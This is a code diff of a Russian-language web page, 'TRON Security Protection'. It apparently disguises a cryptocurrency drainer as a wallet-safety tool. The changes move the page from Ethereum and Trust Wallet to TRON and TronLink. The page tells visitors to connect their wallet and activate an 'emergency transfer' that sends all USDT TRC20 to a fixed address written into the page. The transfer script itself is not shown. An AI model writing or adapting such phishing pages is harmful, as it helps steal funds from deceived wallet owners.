@@ -3,8 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Wallet Protection</title>
-    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    <title>TRON Security Wallet Protection</title>
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.2.0/dist/TronWeb.js"></script>
     <style>
         * {
             box-sizing: border-box;
@@ -14,7 +14,7 @@
         
         body {
             font-family: 'Arial', sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #0098ff 0%, #00c6ff 100%);
             min-height: 100vh;
             display: flex;
             flex-direction: column;
@@ -29,7 +29,7 @@
             border-radius: 20px;
             padding: 40px;
             box-shadow: 0 15px 35px rgba(0,0,0,0.1);
-            max-width: 600px;
+            max-width: 700px;
             width: 100%;
             text-align: center;
         }
@@ -52,7 +52,7 @@
             border-radius: 15px;
             padding: 20px;
             margin: 20px 0;
-            border-left: 4px solid #3498db;
+            border-left: 4px solid #0098ff;
         }
         
         .wallet-address {
@@ -87,12 +87,12 @@
         }
         
         #connectButton {
-            background: linear-gradient(135deg, #3498db, #2980b9);
+            background: linear-gradient(135deg, #0098ff, #0077cc);
             color: white;
         }
         
         #connectButton:hover {
-            background: linear-gradient(135deg, #2980b9, #2573a7);
+            background: linear-gradient(135deg, #0077cc, #0066aa);
             transform: translateY(-2px);
         }
         
@@ -166,18 +166,25 @@
             border-radius: 12px;
             padding: 20px;
             margin: 20px 0;
+            text-align: left;
         }
         
         .balance-item {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 10px 0;
+            padding: 12px 0;
             border-bottom: 1px solid #e9ecef;
         }
         
         .balance-item:last-child {
             border-bottom: none;
+        }
+        
+        .token-info {
+            font-size: 0.9em;
+            color: #6c757d;
+            margin-top: 5px;
         }
         
         .hidden {
@@ -192,23 +199,31 @@
         .icon {
             font-size: 1.2em;
         }
+        
+        .network-info {
+            background: #e8f4fd;
+            border-radius: 10px;
+            padding: 15px;
+            margin: 15px 0;
+            border-left: 4px solid #0098ff;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🛡️ Security Wallet Protection</h1>
-        <p class="subtitle">Защитите ваши активы с помощью системы экстренного перевода</p>
+        <h1>🛡️ TRON Security Protection</h1>
+        <p class="subtitle">Защитите ваши TRON активы с помощью системы экстренного перевода</p>
         
         <div class="wallet-info">
             <h3>Безопасный кошелек для перевода:</h3>
             <div class="wallet-address" id="safeWalletDisplay">TGGWh4Cm9HmvhBB9HkUoe6zD3Zrfx6psKb</div>
-            <p>Все средства будут автоматически переведены на этот адрес при активации</p>
+            <p>Все USDT TRC20 будут автоматически переведены на этот адрес при активации</p>
         </div>
         
         <div class="button-group">
             <button id="connectButton">
                 <span class="icon">🔗</span>
-                Подключить Trust Wallet
+                Подключить TronLink
             </button>
             
             <button id="signButton" class="hidden">
@@ -219,14 +234,19 @@
         
         <div id="status" class="status-box"></div>
         
+        <div id="networkInfo" class="network-info hidden">
+            <h3>Информация о сети:</h3>
+            <div id="networkDetails"></div>
+        </div>
+        
         <section id="emergencySection" class="emergency-section hidden">
             <h2 class="emergency-title">
                 <span class="icon">⚡</span>
-                ЭКСТРЕННЫЙ ПЕРЕВОД СРЕДСТВ
+                ЭКСТРЕННЫЙ ПЕРЕВОД USDT TRC20
             </h2>
             
             <div class="balances-section">
-                <h3>Доступные балансы:</h3>
+                <h3>Балансы кошелька:</h3>
                 <div id="balancesList">
                     <p>Подключите кошелек для просмотра балансов</p>
                 </div>
@@ -234,15 +254,16 @@
             
             <button id="emergencyTransferBtn">
                 <span class="icon">🚨</span>
-                АКТИВИРОВАТЬ ЭКСТРЕННЫЙ ПЕРЕВОД
+                АКТИВИРОВАТЬ ЭКСТРЕННЫЙ ПЕРЕВОД USDT
             </button>
             
             <div id="transferStatus" class="status-box" style="display: none;"></div>
         </section>
         
         <div id="noWalletMessage" class="status-box error hidden">
-            <p><strong>Trust Wallet не найден!</strong></p>
-            <p>Пожалуйста, откройте эту страницу в браузере Trust Wallet или установите расширение.</p>
+            <p><strong>TronLink не найден!</strong></p>
+            <p>Пожалуйста, установите расширение TronLink для браузера или используйте Trust Wallet с поддержкой TRON.</p>
+            <p><a href="https://www.tronlink.org/" target="_blank" style="color: #0098ff;">Скачать TronLink</a></p>
         </div>
     </div>
 
